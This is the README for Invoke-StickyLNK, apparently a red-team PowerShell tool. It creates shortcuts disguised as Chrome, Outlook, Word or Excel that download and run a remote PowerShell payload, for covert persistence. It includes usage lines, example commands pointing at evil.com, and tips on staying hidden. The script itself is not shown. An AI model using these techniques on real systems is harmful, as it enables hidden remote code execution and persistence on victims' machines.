```
  /$$$$$$   /$$     /$$           /$$                /$$       /$$   /$$ /$$   /$$          
 /$$__  $$ | $$    |__/          | $$                 $$      | $$$ | $$| $$  /$$/          
| $$  \__//$$$$$$   /$$  /$$$$$$$| $$   /$$ /$$   /$$ $$      | $$$$| $$| $$ /$$/  
|  $$$$$$|_  $$_/  | $$ /$$_____/| $$  /$$/| $$  | $$ $$      | $$ $$ $$| $$$$$/ 
 \____  $$ | $$    | $$| $$      | $$$$$$/ | $$  | $$ $$      | $$  $$$$| $$  $$ 
 /$$  \ $$ | $$ /$$| $$| $$      | $$_  $$ | $$  | $$ $$      | $$\  $$$| $$\  $$ 
|  $$$$$$/ |  $$$$/| $$|  $$$$$$$| $$ \  $$|  $$$$$$$ $$$$$$$$| $$ \  $$| $$ \  $$ 
 \______/   \___/  |__/ \_______/|__/  \__/ \____  $$________/|__/  \__/|__/  \__/
                                            /$$  | $$                                                
                                           |  $$$$$$/                                                
                                            \______/                                                 
```
# Invoke-StickyLNK

Author: Benjamin Spence (@bSpence7337)

# Description
Creates cradled .lnk files for user-driven persistence. Places the$ shortcuts in taskbar, startmenu, or startup locations. To maintain covertness do not place on desktop. For Taskbar, best to overwrite existing shortcuts.
# Usage
```
usage: Invoke-StickLNK.ps1 
	-URL (Your Powershell URL. http://8.8.8.8/a ) 
	-Appname options:winword.exe,outlook.exe,chrome.exe (Or specify your own executable and the executable must exist on the system)
	-Type options: Startup, StartMenu, Taskbar (Which known location to save the .LNK)
	-LNKNameInput (If using your own executable, specify the displayed .lnk filename, ex. "Adobe Reader.lnk)

```
Example 1 - Use the built in chrome.exe, outlook.exe, or winword.exe
```
PS > Import-Module Invoke-StickyLNK.ps1
PS > Invoke-StickyLNK -URL http://evil.com:80/URI -Appname chrome.exe -Type Taskbar 
```

Example 2 - When you specify your own executable, you must specify the named LNKNameInput (ex. "Excel 2013.lnk")
```
PS > Import-Module Invoke-StickyLNK.ps1
PS > Invoke-StickyLNK.ps1 -URL http://evil.com:80/URI -Appname excel.exe -Type StartMenu -LNKNameInput "Excel 2013.lnk"
```

# Blog Write-up
https://bspence7337.github.io/bSpenceSecurity/Sticky-LNKz/

# Credits
* @enigma0x3 - Initial LNK script for hosted payloads
* @bluscreenofjeff - Feedback, testing, validation, "Thought Leadership"
